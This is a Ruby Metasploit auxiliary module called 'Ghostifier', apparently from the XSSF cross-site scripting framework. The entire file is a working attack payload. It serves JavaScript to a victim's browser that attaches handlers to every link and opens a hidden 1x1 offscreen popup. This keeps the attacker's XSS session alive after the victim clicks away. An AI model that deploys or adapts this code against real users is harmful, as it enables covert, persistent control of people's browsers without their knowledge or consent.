require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'Ghostifier',
			'Description' => 'Open a popup to keep conexion when victim click on a link'
		))
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			function ghostinit(){
				var ghost = open(document.URL, "XSSF_GHOST", "top=100000, left=100000, height=1, width=1, dialog=yes, dependent=yes, status=no");
				ghost.blur();
				if (navigator.userAgent.indexOf('Chrome/') > 0) window.blur();
				window.name = escape(ghostinit.toString());
			}

			var ghostlinks = document.getElementsByTagName('a');
						
			for (var i = 0; i < ghostlinks.length; i++) {
				ghostlinks[i].onclick = function(){
					ghostinit();
				};
			}
		}
		
		send_response(cli, code)
	end
end